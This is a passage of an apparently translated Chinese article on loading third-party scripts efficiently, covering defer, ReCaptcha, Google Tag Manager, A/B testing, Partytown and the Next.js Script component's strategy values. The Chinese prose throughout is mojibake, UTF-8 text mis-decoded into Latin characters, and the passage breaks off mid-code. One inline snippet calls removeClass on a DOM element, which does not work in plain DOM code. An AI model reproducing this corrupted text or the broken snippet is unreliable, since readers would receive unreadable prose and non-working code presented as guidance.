è½½é¡ºåº\nè€ƒè™‘ä¸Šè¿°é’ˆå¯¹ä¸åŒç±»å‹ç¬¬ä¸‰æ–¹çš„æŒ‡å—åŠå…¶å¯¹é¡µé¢çš„ä»·å€¼ã€‚ æ ¹æ®æ¯ä¸ªèµ„æºçš„é¢„æœŸç”¨é€”ï¼Œå¯ä»¥éµå¾ªç†æƒ³çš„èµ„æºåŠ è½½é¡ºåºï¼Œä»¥æœ€ä½³æ–¹å¼äº¤é”™ç¬¬ä¸€æ–¹å’Œç¬¬ä¸‰æ–¹èµ„æºï¼Œä»¥åŠ å¿«é¡µé¢åŠ è½½é€Ÿåº¦ã€‚\n\ræŒ‰è„šæœ¬ç±»å‹åˆ’åˆ†çš„æœ€ä½³å®è·µ æœ‰äº›è„šæœ¬æ¯”å…¶ä»–è„šæœ¬æ›´å®¹æ˜“ä¼˜åŒ–ã€‚\nä¸ Web æ€§èƒ½ä¸“å®¶å°±ä¼˜åŒ–ä¸åŒçš„ç¬¬ä¸‰æ–¹ã€è§‚å¯Ÿåˆ°çš„ä¸€äº›å…¸å‹çº¦æŸä»¥åŠä»–ä»¬åŠ è½½ç¬¬ä¸‰æ–¹çš„æ„¿æœ›æ¸…å•è¿›è¡Œè®¨è®ºåï¼Œå¾—å‡ºäº†ä¸€äº›æœ‰è¶£çš„ç»“è®ºã€‚\næ™®éçš„å…±è¯†æ˜¯ï¼Œå¤§å¤šæ•°ç”¨æˆ·åœ¨çœ‹åˆ°æŸä¸ªç‰¹å®šé˜ˆå€¼çš„å†…å®¹ä¹‹å‰ä¸ä¼šä¸ç«™ç‚¹è¿›è¡Œäº¤äº’ã€‚\nä»¥ä¸‹æ˜¯ç‰¹å®šäºä¸åŒè„šæœ¬ç±»å‹çš„æŒ‡å—ã€‚\néå…³é”® JavaScript å¤§å¤šæ•°ç¬¬ä¸‰æ–¹ï¼ˆå¦‚èŠå¤©å°éƒ¨ä»¶æˆ–åˆ†æè„šæœ¬ï¼‰å¯¹ç”¨æˆ·ä½“éªŒå¹¶ä¸é‡è¦ï¼Œå¯èƒ½ä¼šå»¶è¿Ÿã€‚ ä½¿ç”¨ defer è„šæœ¬å±æ€§æ˜¯å»¶è¿Ÿè¿™äº›è„šæœ¬çš„åŠ è½½å’Œæ‰§è¡Œçš„æœ€å¸¸ç”¨æ–¹æ³•ã€‚\nå¹¿å‘Šæˆ–åˆ†æå›¢é˜Ÿå¯èƒ½ä¼šæ‹…å¿ƒæ¨è¿Ÿè„šæœ¬å¯¹åº”ç”¨ç¨‹åºçš„å¯è§æ€§å’Œå¹¿å‘Šæ”¶å…¥çš„å½±å“ã€‚ Telegraph æ¡ˆä¾‹ç ”ç©¶ç»å¸¸åœ¨è¿™ç§æƒ…å†µä¸‹è¢«å¼•ç”¨ï¼Œå…¶ä¸­æ¨è¿Ÿæ‰€æœ‰è„šæœ¬ä¸ä¼šå½±å“ä»»ä½•åˆ†ææˆ–å¹¿å‘ŠæŒ‡æ ‡ã€‚ ç›¸åï¼Œç¬¬ä¸€ä¸ªå¹¿å‘ŠåŠ è½½æŒ‡æ ‡å¹³å‡æé«˜äº† 4 ç§’ã€‚ ä¸€äº›å¼€å‘äººå‘˜è¿˜è®¾è®¡äº†ä¸€äº›è§£å†³æ–¹æ¡ˆï¼Œå°†ç¬¬ä¸‰æ–¹çš„åŠ è½½å»¶è¿Ÿåˆ°é¡µé¢å˜ä¸ºå¯äº¤äº’ä¹‹åã€‚\næœºå™¨äººæ£€æµ‹/ReCaptcha ç”±äºå¸Œæœ›é˜»æ­¢æœºå™¨äººè®¿é—® Web è¡¨å•ï¼Œå› æ­¤å¼€å‘äººå‘˜é€šå¸¸ä¼šå°½æ—©åŠ è½½è¿™äº›è„šæœ¬ã€‚\nç„¶è€Œï¼ŒReCaptcha æœ‰ç›¸å½“å¤§çš„ JS è´Ÿè½½å’Œä¸»çº¿ç¨‹å ç”¨ç©ºé—´ï¼Œå› æ­¤æœ‰åŠ¨åŠ›å°†å®ƒæ¨è¿Ÿåˆ°éœ€è¦æ—¶åŠ è½½ã€‚\nä¼˜åŒ–æ­¤è„šæœ¬çš„å‡ ç§æ–¹æ³•æ˜¯\n  ä»…åœ¨å‡ ä¸ªé¡µé¢ä¸ŠåŠ è½½å®ƒï¼Œå…¶ä¸­åŒ…å«å¯èƒ½è¢«æœºå™¨äººå‘é€åƒåœ¾é‚®ä»¶çš„ç”¨æˆ·è¡¨å•è¾“å…¥ã€‚\n  å½“ç”¨æˆ·ä¸è¡¨å•äº¤äº’æ—¶å»¶è¿ŸåŠ è½½è„šæœ¬ï¼Œä¾‹å¦‚ï¼Œåœ¨è¡¨å•ç„¦ç‚¹ä¸Šã€‚\n  å½“éœ€è¦åœ¨é¡µé¢åŠ è½½æ—¶æ‰§è¡Œè„šæœ¬ï¼Œä½¿ç”¨èµ„æºæç¤ºå»ºç«‹æ—©æœŸè¿æ¥ã€‚\n  è°·æ­Œæ ‡ç­¾ç®¡ç†å™¨ (GTM) å¤§å‹ç½‘ç«™é€šå¸¸å…è®¸ Google è·Ÿè¸ªä»£ç ç®¡ç†å™¨è®¿é—®è¥é”€å›¢é˜Ÿæˆ–ä»£ç†æœºæ„ã€‚\nè¿™å…è®¸ä»–ä»¬å‘ç½‘ç«™ä¸Šçš„æ‰€æœ‰é¡µé¢æ·»åŠ æ–°çš„è¥é”€æ ‡ç­¾ï¼Œä»¥ä¾¿æ›´å¥½åœ°è¿›è¡Œè·Ÿè¸ªã€‚\næ€§èƒ½ä¸æ˜¯è¥é”€å›¢é˜Ÿçš„ä¸»è¦å…³æ³¨ç‚¹ï¼Œä»–ä»¬æ‰€æœ‰äººå¯èƒ½éƒ½ä¸çŸ¥é“ï¼Œä¸åŠ è€ƒè™‘åœ°æ·»åŠ æ ‡ç­¾ä¼šå‡æ…¢ç½‘ç«™çš„é€Ÿåº¦ã€‚\nGTM è„šæœ¬çš„ä¼˜åŒ–æ›´å¤šæ˜¯å…³äºæ§åˆ¶è°è®¿é—® GTM å¹¶ç›‘æ§ä»–ä»¬æ‰€åšçš„æ›´æ”¹ã€‚\nå¯ä»¥é¦–å…ˆç¡®ä¿ç½‘ç«™æ‰€æœ‰è€…æ‹¥æœ‰å¸æˆ·è€Œä¸æ˜¯å¤–éƒ¨æœºæ„ã€‚è¿™å…è®¸æ‚¨ä¸ºå¯ä»¥æ·»åŠ ã€ç¼–è¾‘å’Œå‘å¸ƒæ ‡ç­¾çš„äººå‘˜å®šä¹‰ç²¾ç»†çš„è®¿é—®æƒé™ã€‚\nå¯ä»¥åœ¨å¼€å‘å’Œè¥é”€éƒ¨é—¨ä¹‹é—´å»ºç«‹æ›´å¥½çš„åä½œæ¥å®¡æ ¸æ–°æ ‡ç­¾å¹¶åˆ é™¤æœªä½¿ç”¨çš„æ ‡ç­¾ã€‚\nç½‘ç«™å¯èƒ½ä¸éœ€è¦åœ¨æ‰€æœ‰é¡µé¢ä¸Šä½¿ç”¨ GTMã€‚ ï¼ˆä¾‹å¦‚ï¼Œè¥é”€å›¢é˜Ÿæ²¡æœ‰ç†ç”±åœ¨ç”µå­å•†åŠ¡ç½‘ç«™çš„ç»“å¸é¡µé¢ä¸Šè·Ÿè¸ªäº‹ä»¶ï¼‰ã€‚\nåº”å•ç‹¬å®¡æ ¸é¡µé¢ï¼Œä»¥ä¾¿åˆ é™¤ä¸å¿…è¦çš„ GTM å†…å®¹ã€‚\nå¦‚æœç”¨æˆ·æ‹’ç» cookieï¼Œä½¿ç”¨ cookie æ¨ªå¹…çš„ç«™ç‚¹ä¹Ÿå¯ä»¥é€‰æ‹©ä¸åŠ è½½ GTMã€‚\næœ€åï¼Œå¦‚æœå¿…é¡»åœ¨é¡µé¢ä¸ŠåŠ è½½ GTMï¼Œå¯ä»¥åœ¨åŠ è½½ä¸»è¦å†…å®¹åæ¨è¿Ÿè§¦å‘è„šæœ¬ã€‚\nå¦ä¸€ä¸ªé€‚ç”¨äºæ—§ç¬¬ä¸‰æ–¹è„šæœ¬æ ‡ç­¾çš„ä¼˜åŒ–ä¸ document.write() ç›¸å…³ã€‚\nä½¿ç”¨ document.write() æ³¨å…¥è„šæœ¬æ˜¯ä¸å®‰å…¨çš„ï¼Œå¹¶ä¸”å¯èƒ½ä¼šå¯¼è‡´åŸºäºæµè§ˆå™¨å’Œè„šæœ¬ç±»å‹çš„è­¦å‘Šæˆ–é”™è¯¯ã€‚\nä¸€äº›ç¬¬ä¸‰æ–¹è„šæœ¬ä»ç„¶ä½¿ç”¨è¿™ç§æ–¹æ³•ã€‚ GTM åœ¨å…¶è‡ªå®šä¹‰ HTML æ ‡ç­¾åˆ›å»ºç•Œé¢ä¸­æä¾›äº†ä¸€ä¸ªåä¸º Support document.write() çš„é…ç½®ã€‚\nå¦‚æœå¯ç”¨æ­¤åŠŸèƒ½ï¼ŒGoogle æ ‡ç­¾ç®¡ç†å™¨ä¼šä¸´æ—¶ç”¨è‡ªå·±çš„å®‰å…¨ç‰ˆæœ¬æ›¿æ¢é»˜è®¤çš„ document.write() å‡½æ•°ã€‚\nA/B æµ‹è¯•å’Œä¸ªæ€§åŒ– ç½‘ç«™è¿›è¡Œ A/B æµ‹è¯•ä»¥æ£€æŸ¥å“ªä¸ªç‰ˆæœ¬çš„ç½‘é¡µæ€§èƒ½æ›´å¥½ã€‚\né¡µé¢çš„ä¸¤ç§å˜ä½“ä¹‹ä¸€æ˜¯ä¸ºå·²è¯†åˆ«çš„ç”¨æˆ·æ ·æœ¬ä¸­çš„ä¸åŒç”¨æˆ·åŠ è½½çš„ã€‚ A/B æµ‹è¯•ä¼šæ˜¾ç€å½±å“è¿è¡Œå®ƒä»¬çš„é¡µé¢çš„æ€§èƒ½ï¼Œæ¯ä¸ªæµ‹è¯•éƒ½ä¼šå¢åŠ å¤šè¾¾ 1 ç§’çš„åŠ è½½æ—¶é—´ã€‚\nç›®å‰ï¼Œè®¸å¤š A/B æµ‹è¯•éƒ½æ˜¯é€šè¿‡ç¬¬ä¸‰æ–¹ä»å¤–éƒ¨è·å–çš„ï¼Œå¼€å‘äººå‘˜å‡ ä¹æ— æ³•æ§åˆ¶ä¸ºæ›´æ”¹è¿™äº›æµ‹è¯•çš„ UI è€Œæ‰§è¡Œçš„ JavaScript ä»£ç ã€‚\nç«™ç‚¹ä¸ªæ€§åŒ–æ˜¯ä¸€ä¸ªç›¸å…³æ¦‚å¿µï¼Œå®ƒæ¶‰åŠè¿è¡Œè„šæœ¬ä»¥æ ¹æ®å·²çŸ¥æ•°æ®ä¸ºä¸åŒç”¨æˆ·æä¾›é‡èº«å®šåˆ¶çš„ä½“éªŒã€‚\nè¿™äº›è„šæœ¬åŒæ ·å¾ˆé‡å¹¶ä¸”éš¾ä»¥ä¼˜åŒ–ã€‚ä¸ A/B æµ‹è¯•è„šæœ¬ä¸€æ ·ï¼Œä¸ªæ€§åŒ–è„šæœ¬ä¹Ÿéœ€è¦å°½æ—©è¿è¡Œï¼Œå› ä¸ºå‘ˆç°çš„ UI å–å†³äºè„šæœ¬çš„è¾“å‡ºã€‚\nä¸º A/B æµ‹è¯•å’Œä¸ªæ€§åŒ–å¼€å‘åŸºäºæœåŠ¡å™¨çš„è‡ªå®šä¹‰è§£å†³æ–¹æ¡ˆæ˜¯ä¼˜åŒ– A/B æµ‹è¯•çš„ç†æƒ³æ–¹æ³•ã€‚ç„¶è€Œï¼Œå®ƒå¯èƒ½å¹¶ä¸æ€»æ˜¯å¯è¡Œçš„ã€‚\nä¸ºäº†ä¼˜åŒ–ç¬¬ä¸‰æ–¹ A/B æµ‹è¯•è„šæœ¬ï¼Œæ‚¨å¯ä»¥é™åˆ¶æ¥æ”¶è„šæœ¬çš„ç”¨æˆ·æ•°ã€‚\nè¯¥è„šæœ¬æ ¹æ®è¯•æ¢æ³•ç¡®å®šè¦æ˜¾ç¤ºçš„ç‰ˆæœ¬ï¼Œå¹¶ä¸ºç”¨æˆ·å¯ç”¨æ­£ç¡®çš„ç‰ˆæœ¬ã€‚è¿™å¯èƒ½ä¼šå‡æ…¢æ‰€æœ‰ç”¨æˆ·çš„é¡µé¢é€Ÿåº¦ã€‚ Google çš„ä¼˜åŒ–å™¨å…è®¸é…ç½®ç”¨äºå®šä½ç”¨æˆ·çš„è§„åˆ™ã€‚å…¶ä¸­è®¸å¤šè§„åˆ™éƒ½å¯ä»¥åœ¨ Google æœåŠ¡å™¨ä¸Šè¿›è¡Œè¯„ä¼°ï¼Œå› æ­¤å¯¹éç›®æ ‡ç”¨æˆ·çš„æ€§èƒ½å½±å“å¾ˆå°ã€‚\nYouTube å’Œåœ°å›¾åµŒå…¥ è¿™äº›åµŒå…¥å¾ˆé‡ï¼Œå¼€å‘äººå‘˜å¿…é¡»æ¢ç´¢å»¶è¿ŸåŠ è½½æˆ–ç‚¹å‡»åŠ è½½æ¨¡å¼æ¥åŠ è½½åµŒå…¥ä»¥ä¼˜åŒ–å®ƒä»¬ã€‚\né¼“åŠ±ä½¿ç”¨ lite-youtube-embed ç­‰è§£å†³æ–¹æ¡ˆï¼ŒåŒæ—¶æ³¨æ„åœ¨ iOS/macOS-Safari ä¸­éœ€è¦åŒå‡»/å•å‡»æ‰èƒ½ä½¿ç”¨æ­¤å¤–è§‚æ’­æ”¾è§†é¢‘ã€‚\nç¤¾äº¤åª’ä½“åµŒå…¥ ä¸€äº›ç¤¾äº¤åª’ä½“åµŒå…¥æä¾›äº†å»¶è¿ŸåŠ è½½è„šæœ¬çš„é€‰é¡¹ï¼ˆä¾‹å¦‚ï¼ŒFacebook åµŒå…¥ä¸­çš„æ•°æ®å»¶è¿Ÿï¼‰ã€‚\nå¯ä»¥æ¢ç´¢å®ƒä»¥æé«˜æ€§èƒ½ã€‚\nå¦ä¸€ç§é€‰æ‹©æ˜¯ä½¿ç”¨æ‰‹åŠ¨åˆ›å»ºçš„å›¾åƒå¤–è§‚æˆ–ä½¿ç”¨è¯¸å¦‚ tweetpik ä¹‹ç±»çš„å·¥å…·ã€‚\nå¼€ç®±å³ç”¨çš„ä¼˜åŒ– ä¸ºäº†ä¼˜åŒ–ç¬¬ä¸‰æ–¹ï¼Œå¼€å‘å›¢é˜Ÿåº”è¯¥äº†è§£èµ„æºæç¤ºã€å»¶è¿ŸåŠ è½½ã€HTTP ç¼“å­˜å’ŒæœåŠ¡å·¥ä½œè€…çš„ç»†å¾®å·®åˆ«ï¼Œç„¶ååœ¨ä»–ä»¬çš„è§£å†³æ–¹æ¡ˆä¸­å®ç°è¿™äº›ã€‚ä¸€äº›æ¡†æ¶å’Œåº“ä»¥å¼€å‘äººå‘˜å¯ä»¥è½»æ¾ä½¿ç”¨çš„æ–¹å¼å°è£…äº†è¿™äº›æœ€ä½³å®è·µã€‚\nç”± Builder.io åˆ›å»ºçš„ Partytown æ˜¯ä¸€ä¸ªå®éªŒæ€§åº“ï¼Œå¯å¸®åŠ©åœ¨ Web Worker è€Œä¸æ˜¯ä¸»çº¿ç¨‹ä¸Šè¿è¡Œèµ„æºå¯†é›†å‹è„šæœ¬ã€‚ä»–ä»¬çš„ç†å¿µæ˜¯ä¸»çº¿ç¨‹åº”è¯¥ä¸“ç”¨äºæ‚¨çš„ä»£ç ï¼Œå…³é”®è·¯å¾„ä¸éœ€è¦çš„ä»»ä½•è„šæœ¬éƒ½å¯ä»¥è¢«æ²™ç®±åŒ–å¹¶éš”ç¦»åˆ°ç½‘ç»œå·¥ä½œè€…ã€‚ Partytown å…è®¸æ‚¨é…ç½®å¯¹ä¸»çº¿ç¨‹ APIï¼ˆå¦‚ cookieã€localStorageã€userAgent ç­‰ï¼‰çš„è®¿é—®ã€‚API è°ƒç”¨ä¹Ÿå¯ä»¥ä½¿ç”¨å‚æ•°è®°å½•ï¼Œä»¥ä¾¿æ›´å¥½åœ°äº†è§£è„šæœ¬çš„ä½œç”¨ã€‚\nJavaScript ä»£ç†å’Œ Service Worker å¤„ç† Web Worker å’Œä¸»çº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚ Partytown è„šæœ¬å¿…é¡»è‡ªæ‰˜ç®¡åœ¨ä¸ HTML æ–‡æ¡£ç›¸åŒçš„æœåŠ¡å™¨ä¸Šã€‚å®ƒå¯ä»¥ä¸ React æˆ– Next.js åº”ç”¨ç¨‹åºä¸€èµ·ä½¿ç”¨ï¼Œç”šè‡³å¯ä»¥åœ¨æ²¡æœ‰ä»»ä½•æ¡†æ¶çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚å¯ä»¥åœ¨ Web æœåŠ¡å™¨ä¸­æ‰§è¡Œçš„æ¯ä¸ªç¬¬ä¸‰æ–¹è„šæœ¬éƒ½åº”å°†å…¶æ‰“å¼€è„šæœ¬æ ‡è®°çš„ç±»å‹å±æ€§è®¾ç½®ä¸º text/partytownï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\n1 2 3 4  \u0026lt;script type=\u0026#34;text/partytown\u0026#34;\u0026gt; // Third-party analytics scripts \u0026lt;/script\u0026gt;   è¯¥åº“è¿˜æä¾›äº†ä¸€ä¸ª React Partytown ç»„ä»¶ï¼Œæ‚¨å¯ä»¥ç›´æ¥å°†å…¶åŒ…å«åœ¨æ‚¨çš„ React æˆ– Next.js é¡¹ç›®ä¸­ã€‚\nå¯¹äº Next.js æ–‡æ¡£ï¼Œå®ƒå¯ä»¥åŒ…å«åœ¨æ–‡æ¡£ \u0026lt;head\u0026gt; ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\nimport { Partytown } from \u0026#39;@builder.io/partytown/react\u0026#39;;\rimport Document, { Html, Head, Main, NextScript } from \u0026#39;next/document\u0026#39;;\rexport default class MyDocument extends Document {\rrender() {\rreturn (\r\u0026lt;Html\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;Partytown /\u0026gt;\r\u0026lt;/Head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;Main /\u0026gt;\r\u0026lt;NextScript /\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/Html\u0026gt;\r);\r} Partytown è¿˜åŒ…æ‹¬ç”¨äºå¸¸è§åˆ†æåº“ï¼ˆä¾‹å¦‚ Google æ ‡ç­¾ç®¡ç†å™¨ï¼‰çš„ React ç»„ä»¶ã€‚\nä»¥ä¸‹ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•å°†å…¶æ·»åŠ åˆ° React/Next.js é¡¹ç›®ä¸­ã€‚\nimport { Partytown, GoogleTagManager, GoogleTagManagerNoScript } from \u0026#39;@builder.io/partytown/react\u0026#39;;\rimport Document, { Html, Head, Main, NextScript } from \u0026#39;next/document\u0026#39;;\rexport default class MyDocument extends Document {\rrender() {\rreturn (\r\u0026lt;Html\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;GoogleTagManager containerId={\u0026#39;GTM-XXXXX\u0026#39;} /\u0026gt;\r\u0026lt;Partytown /\u0026gt;\r\u0026lt;/Head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;GoogleTagManagerNoScript containerId={\u0026#39;GTM-XXXXX\u0026#39;} /\u0026gt;\r\u0026lt;Main /\u0026gt;\r\u0026lt;NextScript /\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/Html\u0026gt;\r);\r} Next.js æœ¬èº«é€šè¿‡å…¶ Script ç»„ä»¶ä¸ºç¬¬ä¸‰æ–¹è„šæœ¬æä¾›å¼€ç®±å³ç”¨çš„ä¼˜åŒ–ã€‚\nè®©æˆ‘ä»¬çœ‹çœ‹è¿™å¦‚ä½•è®©æˆ‘ä»¬æé«˜ä¸åŒç¬¬ä¸‰æ–¹çš„åŠ è½½æ€§èƒ½ã€‚\n\rNext.js è„šæœ¬ç»„ä»¶ âœ” Next.js 11 äº 2021 å¹´å¹´ä¸­å‘å¸ƒï¼Œå…¶ç»„ä»¶åŸºäº Google çš„ Aurora å›¢é˜Ÿå¼•å…¥çš„ä¸€è‡´æ€§æ–¹æ³•ã€‚\nConformance æ˜¯ä¸€ä¸ªç³»ç»Ÿï¼Œå®ƒæä¾›ç²¾å¿ƒè®¾è®¡çš„è§£å†³æ–¹æ¡ˆå’Œè§„åˆ™ï¼Œä»¥æ”¯æŒæœ€ä½³åŠ è½½å’Œ Core Web Vitalsã€‚\nä¸€è‡´æ€§å°†æœ€ä½³å®è·µç¼–å…¥è§„åˆ™é›†ï¼Œå¼€å‘äººå‘˜å¯ä»¥è½»æ¾å®æ–½ã€‚\nå¼ºå¤§çš„é»˜è®¤è®¾ç½®å’Œå¯æ“ä½œçš„è§„åˆ™æ„æˆäº†è¯¥ç³»ç»Ÿçš„åŸºç¡€ã€‚\nå®ƒä»¬ä½¿å¼€å‘äººå‘˜å¯ä»¥è½»æ¾åœ°åšæ­£ç¡®çš„äº‹æƒ…å¹¶é˜²æ­¢åæ¨¡å¼æ½œå…¥ã€‚\nNext.js è„šæœ¬ç»„ä»¶é€šè¿‡æä¾›å¯æé«˜åŠ è½½æ€§èƒ½çš„å¯è‡ªå®šä¹‰æ¨¡æ¿æ¥ä½¿ç”¨ä¸€è‡´æ€§ã€‚\nScript ç»„ä»¶å°è£…äº† \u0026lt;script\u0026gt; æ ‡ç­¾ï¼Œå…è®¸ä½¿ç”¨ strategy å±æ€§è®¾ç½®ç¬¬ä¸‰æ–¹è„šæœ¬çš„åŠ è½½ä¼˜å…ˆçº§ã€‚\nç­–ç•¥å±æ€§å¯ä»¥é‡‡ç”¨ä¸‰ä¸ªå€¼ã€‚\n  beforeInteractiveï¼šå°†æ­¤ç”¨äºæµè§ˆå™¨åº”åœ¨é¡µé¢å˜ä¸ºäº¤äº’å¼ä¹‹å‰æ‰§è¡Œçš„å…³é”®è„šæœ¬ã€‚ ï¼ˆä¾‹å¦‚ï¼Œæœºå™¨äººæ£€æµ‹ï¼‰\n  afterInteractiveï¼šç”¨äºåœ¨é¡µé¢äº¤äº’åæµè§ˆå™¨å¯ä»¥è¿è¡Œçš„è„šæœ¬ã€‚ ï¼ˆä¾‹å¦‚ï¼Œæ ‡ç­¾ç®¡ç†å™¨ï¼‰è¿™æ˜¯åº”ç”¨çš„é»˜è®¤ç­–ç•¥ï¼Œç›¸å½“äºä½¿ç”¨ defer åŠ è½½è„šæœ¬\n  lazyOnloadï¼šç”¨äºåœ¨æµè§ˆå™¨ç©ºé—²æ—¶å¯ä»¥å»¶è¿ŸåŠ è½½çš„è„šæœ¬ã€‚\n  è®¾ç½®ç­–ç•¥æœ‰åŠ©äº Next.js è‡ªåŠ¨åº”ç”¨ä¼˜åŒ–å’Œæœ€ä½³å®è·µæ¥åŠ è½½è„šæœ¬ï¼ŒåŒæ—¶ç¡®ä¿æœ€ä½³åŠ è½½é¡ºåºã€‚\nå¯ä»¥ä½¿ç”¨å¸¦æœ‰ç­–ç•¥å±æ€§çš„è„šæœ¬æ ‡è®°ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\nä¸åŸç”Ÿ HTML è„šæœ¬æ ‡ç­¾ä¸åŒï¼Œä¸å¾—å°† next/script æ ‡ç­¾æ”¾ç½®åœ¨ next/head ç»„ä»¶æˆ– pages/document.js ä¸­ã€‚\nBefore:\nimport Head from \u0026#39;next/head\u0026#39;\rexport default function Home() {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;Head\u0026gt;\r\u0026lt;script async src=\u0026#34;https://example.com/samplescript.js\u0026#34; /\u0026gt;\r\u0026lt;/Head\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} After:\n1 2 3 4 5 6 7 8 9 10 11 12  // pages/index.js // å½“æœªæŒ‡å®šç­–ç•¥æ—¶ï¼Œå°†åº”ç”¨é»˜è®¤ç­–ç•¥ afterinteractiveã€‚ import Script from \u0026#39;next/script\u0026#39; \u0026lt;br\u0026gt; export default function Home() { return ( \u0026lt;\u0026gt; \u0026lt;Script src=\u0026#34;https://example.com/samplescript.js\u0026#34; /\u0026gt; \u0026lt;/\u0026gt; ) }   Script ç»„ä»¶å…è®¸å¤„ç†å‰é¢è®¨è®ºçš„è®¸å¤šç”¨ä¾‹ã€‚\nå¯ä»¥ä½¿ç”¨å®ƒæ¥åŠ è½½ç”¨äºåˆ†æã€ç¤¾äº¤åª’ä½“ã€å®ç”¨ç¨‹åºåº“ç­‰çš„ç¬¬ä¸‰æ–¹è„šæœ¬ã€‚\nä»¥ä¸‹ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•å°†ä¸Šè¿°ç­–ç•¥åº”ç”¨äºä¸åŒç±»å‹çš„ç¬¬ä¸‰æ–¹è„šæœ¬ã€‚\nå°½æ—©åŠ è½½ polyfill å¦‚æœå¸Œæœ›æå‰åŠ è½½é€‚ç”¨äºæ ¸å¿ƒå†…å®¹çš„ç‰¹å®š polyfillï¼Œå¯ä»¥ä½¿ç”¨ beforeInteractive ç­–ç•¥åŠ è½½ polyfillï¼Œ\nå¦‚ Next.js æ–‡æ¡£ä¸­çš„ä»¥ä¸‹ç¤ºä¾‹æ‰€ç¤ºã€‚\nimport Script from \u0026#39;next/script\u0026#39;\rexport default function Home() {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;Script src=\u0026#34;https://polyfill.io/v3/polyfill.min.js?features=IntersectionObserverEntry%2CIntersectionObserver\u0026#34;\rstrategy=\u0026#34;beforeInteractive\u0026#34;\r/\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} å»¶è¿ŸåŠ è½½ç¤¾äº¤åª’ä½“åµŒå…¥ ç¤¾äº¤åª’ä½“åµŒå…¥ï¼Œå°¤å…¶æ˜¯é‚£äº›åœ¨é¡µé¢åŠ è½½æ—¶ä¸å¯è§çš„åµŒå…¥ï¼Œ\nå¯ä»¥åœ¨ç”¨æˆ·æ»šåŠ¨åˆ°å®ƒä»¬æ—¶æˆ–åœ¨ä¸æ´»åŠ¨æœŸé—´å»¶è¿Ÿæˆ–å»¶è¿ŸåŠ è½½ã€‚\nå¯ä»¥ä½¿ç”¨ lazyonload ç­–ç•¥ï¼Œå¦‚ä»¥ä¸‹ä»£ç æ®µæ‰€ç¤ºã€‚\nimport Script from \u0026#39;next/script\u0026#39;\rexport default function Home() {\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;Script\rsrc=\u0026#34;https://connect.facebook.net/en_US/sdk.js\u0026#34; strategy=\u0026#34;lazyOnload\u0026#34;\r/\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} åœ¨åŠ è½½æ—¶æœ‰æ¡ä»¶åœ°æ‰§è¡Œä»£ç  å¯èƒ½æœ‰ä¸€äº›ä»£ç éœ€è¦åœ¨ç‰¹å®šçš„ç¬¬ä¸‰æ–¹åŠ è½½åæ‰§è¡Œã€‚ è¿™å¯ä»¥åœ¨è„šæœ¬ç»„ä»¶çš„ onload å±æ€§ä¸­æŒ‡å®šã€‚\nä¾‹å¦‚ï¼Œä»¥ä¸‹ä»£ç æ®µæ˜¾ç¤ºäº†å¦‚ä½•åŒ…å«å°†æ ¹æ®ç”¨æˆ·åŒæ„æ‰§è¡Œçš„ä»£ç ã€‚\n1 2 3 4 5 6 7 8  \u0026lt;Script src={url} // åŒæ„ç®¡ç†  strategy=\u0026#34;beforeInteractive\u0026#34; onLoad={() =\u0026gt; { // å¦‚æœåŠ è½½æˆåŠŸï¼Œåˆ™å¯ä»¥ä¾æ¬¡åŠ è½½å…¶ä»–è„šæœ¬  }} /\u0026gt;   åœ¨è„šæœ¬æ ‡ç­¾ä¸­ä½¿ç”¨å†…è”è„šæœ¬ éœ€è¦æ ¹æ®ç¬¬ä¸‰æ–¹ç»„ä»¶çš„è´Ÿè½½æ‰§è¡Œçš„å†…è”è„šæœ¬ä¹Ÿå¯èƒ½åŒ…å«åœ¨ Script ç»„ä»¶ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\nimport Script from \u0026#39;next/script\u0026#39;\r\u0026lt;Script id=\u0026#34;show-banner\u0026#34; strategy=\u0026#34;lazyOnload\u0026#34;\u0026gt;\r{`document.getElementById(\u0026#39;banner\u0026#39;).removeClass(\u0026#39;hidden\u0026#39;)`}\r\u0026lt;/Script\u0026gt;\r// or\r\u0026lt;Script\rid=\u0026#34;show-banner\u0026#34;\rdangerouslySetInnerHTML={{\r__html: `document.getElementById(\u0026#39;banner\u0026#39;).removeClass(\u0026#39;hidden\u0026#39;)`\r}}\r/\u0026gt; è¿™é‡Œçš„å†…è”è„šæœ¬ç”¨äºåœ¨å»¶è¿ŸåŠ è½½åæ›´æ”¹ç¬¬ä¸‰æ–¹æ¨ªå¹…å¹¿å‘Šçš„å¯è§æ€§ã€‚ è¯·æ³¨æ„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å±é™©çš„ SetInnerHTML å±æ€§åŒ…å«å†…è”è„šæœ¬ã€‚\nå°†å±æ€§è½¬å‘ç»™ç¬¬ä¸‰æ–¹è„šæœ¬ å¯ä»¥åœ¨è„šæœ¬ç»„ä»¶ä¸­è®¾ç½®ç¬¬ä¸‰æ–¹è„šæœ¬å¯ä»¥ä½¿ç”¨çš„ç‰¹å®šå±æ€§å€¼ã€‚\nä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºäº†å¦‚ä½•å°†ä¸¤ä¸ªè¿™æ ·çš„å±æ€§ä¼ é€’ç»™åˆ†æè„šæœ¬ã€‚\nimport Script from \u0026#39;next/script\u0026#39;\rexport default function Home() {\rreturn 